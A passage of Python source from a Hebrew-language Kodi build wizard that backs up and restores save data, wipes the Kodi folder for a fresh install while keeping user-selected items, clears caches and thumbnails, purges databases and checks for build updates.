			debridit.debridIt('restore', 'all')
		wiz.cleanHouse(TEMP)
		wiz.removeFolder(TEMP)
		os.remove(tempfile)
		if x == 0: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Save Data Import Failed[/COLOR]" % COLOR2)
		else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Save Data Import Complete[/COLOR]" % COLOR2)
	elif do == 'export':
		mybuilds = xbmc.translatePath(MYBUILDS)
		dir = [traktit.TRAKTFOLD, debridit.REALFOLD, loginit.LOGINFOLD]
		traktit.traktIt('update', 'all')
		loginit.loginIt('update', 'all')
		debridit.debridIt('update', 'all')
		source = DIALOG.browse(3, '[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]' % COLOR2, 'files', '', False, True, HOME)
		source = xbmc.translatePath(source)
		tempzip = os.path.join(mybuilds, 'SaveData.zip')
		zipf = zipfile.ZipFile(tempzip, mode='w')
		for fold in dir:
			if os.path.exists(fold):
				files = os.listdir(fold)
				for file in files:
					zipf.write(os.path.join(fold, file), os.path.join(fold, file).replace(ADDONDATA, ''), zipfile.ZIP_DEFLATED)
		zipf.close()
		if source == mybuilds:
			DIALOG.ok(ADDONTITLE, "[COLOR %s]Save data has been backed up to:[/COLOR]" % (COLOR2), "[COLOR %s]%s[/COLOR]" % (COLOR1, tempzip))
		else:
			try:
				xbmcvfs.copy(tempzip, os.path.join(source, 'SaveData.zip'))
				DIALOG.ok(ADDONTITLE, "[COLOR %s]Save data has been backed up to:[/COLOR]" % (COLOR2), "[COLOR %s]%s[/COLOR]" % (COLOR1, os.path.join(source, 'SaveData.zip')))
			except:
				DIALOG.ok(ADDONTITLE, "[COLOR %s]Save data has been backed up to:[/COLOR]" % (COLOR2), "[COLOR %s]%s[/COLOR]" % (COLOR1, tempzip))

###########################
###### Fresh Install ######
###########################
def freshStart(install=None, over=False):
	if USERNAME == '':
		ADDON.openSettings()
		sys.exit()
	build_f=(SPEEDFILE)
	(build_f)
	WORKINGURL = (wiz.workingURL(build_f))
	(WORKINGURL)
	if KEEPTRAKT == 'true':
		traktit.autoUpdate('all')
		wiz.setS('traktlastsave', str(THREEDAYS))
	if KEEPREAL == 'true':
		debridit.autoUpdate('all')
		wiz.setS('debridlastsave', str(THREEDAYS))
	if KEEPLOGIN == 'true':
		loginit.autoUpdate('all')
		wiz.setS('loginlastsave', str(THREEDAYS))
	if over == True: yes_pressed = 1
	elif install == 'restore': yes_pressed=DIALOG.yesno(ADDONTITLE, "[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם" % COLOR2, "האם להמשיך?[/COLOR]", nolabel='[B][COLOR red]ביטול[/COLOR][/B]', yeslabel='[B][COLOR green]המשך[/COLOR][/B]')
	elif install: yes_pressed=1#DIALOG.yesno(ADDONTITLE, "שימו לב" , "הרחבות, מועדפים, ונתונים ישמרו רק אם סימנתם בהגדרות", "האם להמשיך?" , nolabel='[B][COLOR red]ביטול[/COLOR][/B]', yeslabel='[B][COLOR green]המשך[/COLOR][/B]')
	else: yes_pressed=DIALOG.yesno(ADDONTITLE, "[COLOR %s]התקנת הבילד" % COLOR2, "קודי אנונימוס?[/COLOR]", nolabel='[B][COLOR red]ביטול[/COLOR][/B]', yeslabel='[B][COLOR green]המשך[/COLOR][/B]')
	if yes_pressed:
		if not wiz.currSkin() in ['skin.confluence', 'skin.estouchy', 'skin.estuary', 'skin.anonymous.mod', 'skin.anonymous.nox', 'skin.phenomenal', 'skin.Premium.mod']:
			skin = 'skin.confluence' if KODIV < 17 else 'skin.estuary' if KODIV < 17 else 'skin.anonymous.mod' if KODIV < 17 else 'skin.estouchy' if KODIV < 17 else 'skin.phenomenal' if KODIV < 17 else 'skin.anonymous.nox' if KODIV < 17 else 'skin.Premium.mod'
			#yes=DIALOG.yesno(ADDONTITLE, "[COLOR %s]The skin needs to be set back to [COLOR %s]%s[/COLOR]" % (COLOR2, COLOR1, skin[5:]), "Before doing a fresh install to clear all Texture files,", "Would you like us to do that for you?[/COLOR]", yeslabel="[B][COLOR green]Switch Skins[/COLOR][/B]", nolabel="[B][COLOR red]I'll Do It[/COLOR][/B]";
			#if yes:
			skinSwitch.swapSkins(skin)
			x = 0
			xbmc.sleep(1000)
			while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 150:
				x += 1
				xbmc.sleep(1000)
				wiz.ebi('SendAction(Select)')
			if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
				wiz.ebi('SendClick(11)')
			else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]' % COLOR2); return False
			xbmc.sleep(1000)
		if not wiz.currSkin() in ['skin.confluence', 'skin.estouchy', 'skin.estuary', 'skin.anonymous.mod', 'skin.anonymous.nox', 'skin.phenomenal', 'skin.Premium.mod']:
			wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]' % COLOR2)
			return
		wiz.addonUpdates('set')
		xbmcPath=os.path.abspath(HOME)
		DP.create(ADDONTITLE,"[COLOR %s]מחשב קבצים ותיקיות" % COLOR2,'', 'אנא המתן![/COLOR]')
		total_files = sum([len(files) for r, d, files in os.walk(xbmcPath)]); del_file = 0
		DP.update(0, "[COLOR %s]Gathering Excludes list." % COLOR2)
		EXCLUDES.append('My_Builds')
		EXCLUDES.append('archive_cache')
		EXCLUDES.append('script.module.requests')
		EXCLUDES.append('myfav.anon')
		if KEEPREPOS == 'true':
			repos = glob.glob(os.path.join(ADDONS, 'repo*/'))
			for item in repos:
				repofolder = os.path.split(item[:-1])[1]
				if not repofolder == EXCLUDES:
					EXCLUDES.append(repofolder)
		if KEEPSUPER == 'true':
			EXCLUDES.append('plugin.program.super.favourites')
		if KEEPMOVIELIST == 'true':
			EXCLUDES.append('plugin.video.metalliq')
		if KEEPMOVIELIST == 'true':
			EXCLUDES.append('plugin.video.anonymous.wall')
		if KEEPADDONS == 'true':
			EXCLUDES.append('addons')
		if KEEPTELEMEDIA == 'true':
			EXCLUDES.append('plugin.video.telemedia')
		# if KEEPADDONS == 'true':
			# EXCLUDES.append('addon_data')
#		if KEEPREAL == 'true':
#			EXCLUDES.append('script.module.resolveurl')
		EXCLUDES.append('plugin.video.elementum')
		EXCLUDES.append('script.elementum.burst')
		EXCLUDES.append('script.elementum.burst-master')
		EXCLUDES.append('plugin.video.quasar')
		EXCLUDES.append('script.quasar.burst')
		EXCLUDES.append('skin.estuary')
		#if KEEPTHUMBNAILS == 'true':
			#EXCLUDES.append('Thumbnails')
		if KEEPWHITELIST == 'true':
			pvr = ''
			whitelist = wiz.whiteList('read')
			if len(whitelist) > 0:
				for item in whitelist:
					try: name, id, fold = item
					except: pass
					if fold.startswith('pvr'): pvr = id 
					depends = dependsList(fold)
					for plug in depends:
						if not plug in EXCLUDES:
							EXCLUDES.append(plug)
						depends2 = dependsList(plug)
						for plug2 in depends2:
							if not plug2 in EXCLUDES:
								EXCLUDES.append(plug2)
					if not fold in EXCLUDES:
						EXCLUDES.append(fold)
				if not pvr == '': wiz.setS('pvrclient', fold)
		if wiz.getS('pvrclient') == '':
			for item in EXCLUDES:
				if item.startswith('pvr'):
					wiz.setS('pvrclient', item)
		DP.update(0, "[COLOR %s]מנקה קבצים ותיקיות:" % COLOR2)
		latestAddonDB = wiz.latestDB('Addons')
		for root, dirs, files in os.walk(xbmcPath,topdown=True):
			dirs[:] = [d for d in dirs if d not in EXCLUDES]
			for name in files:
				del_file += 1
				fold = root.replace('/','\\').split('\\')

				x = len(fold)-1
				if fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x]  and KEEPSKIN =='true' : wiz.log("Keep Skin: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'MyVideos99.db' and fold[x-1] == 'userdata' and fold[x-0] == 'Database' and KEEPMOVIEWALL =='true': wiz.log("Keep Movie Wall: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'MyVideos107.db' and fold[x-1] == 'userdata' and fold[x-0] == 'Database' and KEEPMOVIEWALL =='true': wiz.log("Keep Movie Wall: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'MyVideos116.db' and fold[x-1] == 'userdata' and fold[x-0] == 'Database' and KEEPMOVIEWALL =='true': wiz.log("Keep Movie Wall: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'MyVideos99.db' and fold[x-1] == 'userdata' and fold[x-0] == 'Database' and KEEPMOVIELIST =='true': wiz.log("Keep Movie List: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'MyVideos107.db' and fold[x-1] == 'userdata' and fold[x-0] == 'Database' and KEEPMOVIELIST =='true': wiz.log("Keep Movie List: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'MyVideos116.db' and fold[x-1] == 'userdata' and fold[x-0] == 'Database' and KEEPMOVIELIST =='true': wiz.log("Keep Movie List: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'plugin.video.anonymous.wall' in fold[x]  and KEEPMOVIELIST =='true' : wiz.log("Keep View: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'skin.anonymous.mod' in fold[x]  and KEEPVIEW =='true' : wiz.log("Keep View: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'skin.Premium.mod' in fold[x]  and KEEPVIEW =='true' : wiz.log("Keep View: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'skin.anonymous.nox' in fold[x]  and KEEPVIEW =='true' : wiz.log("Keep View: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'skin.phenomenal' in fold[x]  and KEEPVIEW =='true' : wiz.log("Keep View: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'plugin.video.metalliq' in fold[x]  and KEEPMOVIELIST =='true' : wiz.log("Keep Movie List: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				#elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'skin.phenomenal' in fold[x]  and KEEPSKIN2 =='true' : wiz.log("Install phenomenal: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'skin.titan' in fold[x]  and KEEPSKIN3 =='true' : wiz.log("Install titan: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'pvr.iptvsimple' in fold[x]  and KEEPPVR =='true' : wiz.log("Keep Pvr: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				
				elif name == 'sources.xml' and fold[-1] == 'userdata' and KEEPSOURCES == 'true': wiz.log("Keep Sources: %s" % os.path.join(root, name), xbmc.LOGNOTICE)

				
				elif name == 'quicknav.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPTVLIST == 'true': wiz.log("Keep Tv List: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'x1101.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBMOVIE == 'true': wiz.log("Keep Hub Movie: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'b-srtym-b.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBMOVIE == 'true': wiz.log("Keep Hub Movie: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'x1102.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBTVSHOW == 'true': wiz.log("Keep Hub Tvshow: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'b-sdrvt-b.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBTVSHOW == 'true': wiz.log("Keep Hub Tvshow: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'x1112.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBTV == 'true': wiz.log("Keep Hub Tv: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'b-tlvvyzyh-b.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBTV == 'true': wiz.log("Keep Hub Tv: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'x1111.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBVOD == 'true': wiz.log("Keep Hub Vod: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'b-tvknyshrly-b.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBVOD == 'true': wiz.log("Keep Hub Vod: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'x1110.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBKIDS == 'true': wiz.log("Keep Hub Kids: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'b-yldym-b.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBKIDS == 'true': wiz.log("Keep Hub Kids: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'x1114.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBMUSIC == 'true': wiz.log("Keep Hub Music: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'b-mvzyqh-b.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBMUSIC == 'true': wiz.log("Keep Hub Music: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'mainmenu.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBMENU == 'true': wiz.log("Keep Hub Menu: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'skin.Premium.mod.properties' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBMENU == 'true': wiz.log("Keep Hub Menu: %s" % os.path.join(root, name), xbmc.LOGNOTICE)

				elif name == 'x1122.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBSPORT == 'true': wiz.log("Keep Hub Sport: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'b-spvrt-b.DATA.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'script.skinshortcuts' in fold[x] and KEEPHUBSPORT == 'true': wiz.log("Keep Hub Sport: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
                
                
                
                
				elif name == 'favourites.xml' and fold[-1] == 'userdata' and KEEPFAVS == 'true': wiz.log("Keep Favourites: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				#elif name == 'Thumbnails' and fold[-1] == 'userdata' and KEEPTHUMBNAILS == 'true': wiz.log("Keep Thumbnails: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'guisettings.xml' and fold[-1] == 'userdata' and KEEPSOUND == 'true': wiz.log("Keep Sound: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'profiles.xml' and fold[-1] == 'userdata' and KEEPPROFILES == 'true': wiz.log("Keep Profiles: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name == 'advancedsettings.xml' and fold[-1] == 'userdata' and KEEPADVANCED == 'true':  wiz.log("Keep Advanced Settings: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'plugin.video.sdarot.tv' in fold[x]  and KEEPINFO =='true' : wiz.log("Keep Info: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'program.apollo' in fold[x]  and KEEPINFO =='true' : wiz.log("Keep Info: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'plugin.video.allmoviesin' in fold[x]  and KEEPVICTORY =='true' : wiz.log("Keep Info: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'plugin.video.telemedia' in fold[x]  and KEEPTELEMEDIA =='true' : wiz.log("Keep Info: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				#elif name == 'settings.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'plugin.video.gaia' in fold[x] and KEEPRD2 == 'true': wiz.log("Keep Rd 2: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				#elif name == 'settings.xml' and fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'plugin.video.seren' in fold[x] and KEEPRD2 == 'true': wiz.log("Keep Rd 2: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'plugin.video.elementum' in fold[x]  and KEEPINFO =='true' : wiz.log("Keep Info: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				# elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'service.subtitles.All_Subs' in fold[x]  and KEEPINFO =='true' : wiz.log("Keep Info: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'plugin.audio.soundcloud' in fold[x]  and KEEPINFO =='true' : wiz.log("Keep Info: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'weather.yahoo' in fold[x]  and KEEPWEATHER =='true' : wiz.log("Keep weather: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'plugin.video.quasar' in fold[x]  and KEEPINFO =='true' : wiz.log("Keep Info: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'program.apollo' in fold[x]  and KEEPINFO =='true' : wiz.log("Keep Info: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'plugin.video.PastebinPlay' in fold[x]  and KEEPINFO =='true' : wiz.log("Keep Info: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif fold[x-2] == 'userdata' and fold[x-1] == 'addon_data' and 'plugin.video.playlistLoader' in fold[x]  and KEEPPLAYLIST =='true' : wiz.log("Keep playlist: %s" % os.path.join(root, name), xbmc.LOGNOTICE)
				elif name in LOGFILES: wiz.log("Keep Log File: %s" % name, xbmc.LOGNOTICE)
				elif name.endswith('.db'):
					try:
						if name == latestAddonDB and KODIV >= 17: wiz.log("Ignoring %s on v%s" % (name, KODIV), xbmc.LOGNOTICE)
						else: os.remove(os.path.join(root,name))
					except Exception as e: 
						if not name.startswith('Textures13'):
							wiz.log('Failed to delete, Purging DB', xbmc.LOGNOTICE)
							wiz.log("-> %s" % (str(e)), xbmc.LOGNOTICE)
							wiz.purgeDb(os.path.join(root,name))
				else:
					DP.update(int(wiz.percentage(del_file, total_files)), '', '[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name), '')
					try: os.remove(os.path.join(root,name))
					except Exception as e: 
						wiz.log("Error removing %s" % os.path.join(root, name), xbmc.LOGNOTICE)
						wiz.log("-> / %s" % (str(e)), xbmc.LOGNOTICE)
			if DP.iscanceled(): 
				DP.close()
				wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]התקנה נקיה מבוטלת[/COLOR]" % COLOR2)
				return False
		for root, dirs, files in os.walk(xbmcPath,topdown=True):
			dirs[:] = [d for d in dirs if d not in EXCLUDES]
			for name in dirs:
			  DP.update(100, '', 'Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]' % (COLOR1, name), '')
			  if name not in ["Database","userdata","temp","addons","addon_data"]:
			   if not (name == 'script.skinshortcuts' and KEEPSKIN =='true'):
			    
			    if not (name == 'skin.titan' and KEEPSKIN3 =='true'):
			      if not (name == 'pvr.iptvsimple' and KEEPPVR=='true'):
			       if not (name == 'plugin.video.metalliq' and KEEPMOVIELIST=='true'):
			        if not (name == 'plugin.video.sdarot.tv' and KEEPINFO=='true'):
			         if not (name == 'program.apollo' and KEEPINFO=='true'):
			          if not (name == 'script.skinshortcuts' and KEEPHUBMOVIE=='true'):
			           if not (name == 'weather.yahoo' and KEEPWEATHER=='true'):
			            if not (name == 'plugin.video.playlistLoader' and KEEPPLAYLIST=='true'):
			             if not (name == 'script.skinshortcuts' and KEEPHUBTVSHOW=='true'):
			              if not (name == 'script.skinshortcuts' and KEEPHUBTV=='true'):
			               if not (name == 'script.skinshortcuts' and KEEPHUBVOD=='true'):
			                if not (name == 'script.skinshortcuts' and KEEPHUBKIDS=='true'):
			                 if not (name == 'script.skinshortcuts' and KEEPHUBMUSIC=='true'):
			                  if not (name == 'plugin.video.neptune' and KEEPINFO=='true'):
			                   if not (name == 'plugin.video.youtube' and KEEPINFO=='true'):
			                    if not (name == 'service.subtitles.subscenter' and KEEPINFO=='true'):
			                     if not (name == 'script.skinshortcuts' and KEEPHUBMENU=='true'):
			                      if not (name == 'plugin.video.allmoviesin' and KEEPVICTORY=='true'):
			                       if not (name == 'plugin.video.telemedia' and KEEPTELEMEDIA=='true'):
			                        #if not (name == 'Thumbnails' and KEEPTHUMBNAILS=='true'):
			                         #if not (name == 'plugin.video.myriad_gw' and KEEPINFO=='true'):
			                          #if not (name == 'plugin.video.bob.unleashed' and KEEPINFO=='true'):
			                           if not (name == 'plugin.audio.soundcloud' and KEEPINFO=='true'):
			                            if not (name == 'plugin.video.kodipopcorntime' and KEEPINFO=='true'):
			                             if not (name == 'plugin.video.torrenter' and KEEPINFO=='true'):
			                              if not (name == 'plugin.video.quasar' and KEEPINFO=='true'):
			                               if not (name == 'script.skinshortcuts' and KEEPTVLIST=='true'):

			                                  shutil.rmtree(os.path.join(root,name),ignore_errors=True, onerror=None)
			if DP.iscanceled(): 
				DP.close()
				wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]התקנה נקיה מבוטלת[/COLOR]" % COLOR2)
				return False
		DP.close()
		wiz.clearS('build')
		if over == True:
			return True
		elif install == 'restore': 
			return True
		elif install: 
			buildWizard(install, 'normal', over=True)
		else:
			if INSTALLMETHOD == 1: todo = 1
			elif INSTALLMETHOD == 2: todo = 0
			else: todo = DIALOG.yesno(ADDONTITLE, "[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]" % (COLOR2, COLOR1, COLOR1), yeslabel="[B][COLOR red]הצגת נתונים[/COLOR][/B]", nolabel="[B][COLOR green]סגירה[/COLOR][/B]")
			if todo == 1: wiz.reloadFix('fresh')
			else: wiz.addonUpdates('reset'); wiz.killxbmc(True)
	else: 
		if not install == 'restore':
			wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), '[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]' % COLOR2)
			wiz.refresh()

#############################
###DELETE CACHE##############
####THANKS GUYS @ NaN #######
def clearCache():
		wiz.clearCache()
# def fixskin():
		# skinWIN()
		#clearThumb()
def fixwizard():
		wiz.fixwizard()
		#clearThumb()
def totalClean():
	#if DIALOG.yesno(ADDONTITLE, '[COLOR %s]Would you like to clear cache, packages and thumbnails?[/COLOR]' % COLOR2, nolabel='[B][COLOR red]Cancel Process[/COLOR][/B]',yeslabel='[B][COLOR green]Clean All[/COLOR][/B]'):
		wiz.clearCache()
		wiz.clearPackages('total')
		clearThumb('total')
		cleanfornewbuild()
def cleanfornewbuild():
		try:
			os.remove(os.path.join(xbmc.translatePath("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))
		except:
			pass
		try:
			os.remove(os.path.join(xbmc.translatePath("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))
		except:
			pass
		try:
			os.remove(os.path.join(xbmc.translatePath("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))
		except:
			pass
def clearThumb(type=None):
	latest = wiz.latestDB('Textures')
	if not type == None: choice = 1
	else: choice = DIALOG.yesno(ADDONTITLE, '[COLOR %s]Would you like to delete the %s and Thumbnails folder?' % (COLOR2, latest), "They will repopulate on the next startup[/COLOR]", nolabel='[B][COLOR red]Don\'t Delete[/COLOR][/B]', yeslabel='[B][COLOR green]Delete Thumbs[/COLOR][/B]')
	if choice == 1:
		try: wiz.removeFile(os.join(DATABASE, latest))
		except: wiz.log('Failed to delete, Purging DB.'); wiz.purgeDb(latest)
		wiz.removeFolder(THUMBS)
		#if not type == 'total': wiz.killxbmc()
	else: wiz.log('Clear thumbnames cancelled')
	wiz.redoThumbs()

def purgeDb():
	DB = []; display = []
	for dirpath, dirnames, files in os.walk(HOME):
		for f in fnmatch.filter(files, '*.db'):
			if f != 'Thumbs.db':
				found = os.path.join(dirpath, f)
				DB.append(found)
				dir = found.replace('\\', '/').split('/')
				display.append('(%s) %s' % (dir[len(dir)-2], dir[len(dir)-1]))
	if KODIV >= 16: 
		choice = DIALOG.multiselect("[COLOR %s]Select DB File to Purge[/COLOR]" % COLOR2, display)
		if choice == None: wiz.LogNotify("[COLOR %s]Purge Database[/COLOR]" % COLOR1, "[COLOR %s]Cancelled[/COLOR]" % COLOR2)
		elif len(choice) == 0: wiz.LogNotify("[COLOR %s]Purge Database[/COLOR]" % COLOR1, "[COLOR %s]Cancelled[/COLOR]" % COLOR2)
		else: 
			for purge in choice: wiz.purgeDb(DB[purge])
	else:
		choice = DIALOG.select("[COLOR %s]Select DB File to Purge[/COLOR]" % COLOR2, display)
		if choice == -1: wiz.LogNotify("[COLOR %s]Purge Database[/COLOR]" % COLOR1, "[COLOR %s]Cancelled[/COLOR]" % COLOR2)
		else: wiz.purgeDb(DB[purge])


##########################
### DEVELOPER MENU #######
##########################
def fastupdatefirstbuild(NOTEID):
	#xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'בודק אם קיים עדכון בשבילך')))
	wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]' % COLOR2)
	if ENABLE == 'Yes':
		if not NOTIFY == 'true':
			url = wiz.workingURL(NOTIFICATION)
			if url == True:
				id, msg = wiz.splitNotify(NOTIFICATION)

				if not id == False:
					try:
						id = int(id); NOTEID = int(NOTEID)
						checkidupdate()
						wiz.setS("notedismiss","true")
						if id == NOTEID:
							wiz.log("[Notifications] id[%s] Dismissed" % int(id), xbmc.LOGNOTICE)

						elif id > NOTEID:
							wiz.log("[Notifications] id: %s" % str(id), xbmc.LOGNOTICE)
							wiz.setS('noteid', str(id))
							wiz.setS("notedismiss","true")

#						notify.notification(msg=msg)
							wiz.log("[Notifications] Complete", xbmc.LOGNOTICE)
					except Exception as e:
						wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)

				else: wiz.log("[Notifications] Text File not formated Correctly")
			else: wiz.log("[Notifications] URL(%s): %s" % (NOTIFICATION, url), xbmc.LOGNOTICE)
		else: wiz.log("[Notifications] Turned Off", xbmc.LOGNOTICE)
	else: wiz.log("[Notifications] Not Enabled", xbmc.LOGNOTICE)
    
def checkUpdate():
	DISABLEUPDATE  = wiz.getS('disableupdate')
	BUILDNAME      = wiz.getS('buildname')
	BUILDVERSION   = wiz.getS('buildversion')
	link           = wiz.openURL(SPEEDFILE).replace('\n','').replace('\r','').replace('\t','')
	match          = re.compile('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"' % BUILDNAME).findall(link)
	if len(match) > 0:
		version = match[0][0]
		icon    = match[0][1]
		fanart  = match[0][2]
		wiz.setS('latestversion', version)
		if version > BUILDVERSION:
			if DISABLEUPDATE == 'false':
				wiz.log("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window" % (BUILDVERSION, version), xbmc.LOGNOTICE)
				notify.updateWindow(BUILDNAME, BUILDVERSION, version, icon, fanart)
			else: wiz.log("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled" % (BUILDVERSION, version), xbmc.LOGNOTICE)
		else: wiz.log("[Check Updates] [Installed Version: %s] [Current Version: %s]" % (BUILDVERSION, version), xbmc.LOGNOTICE)
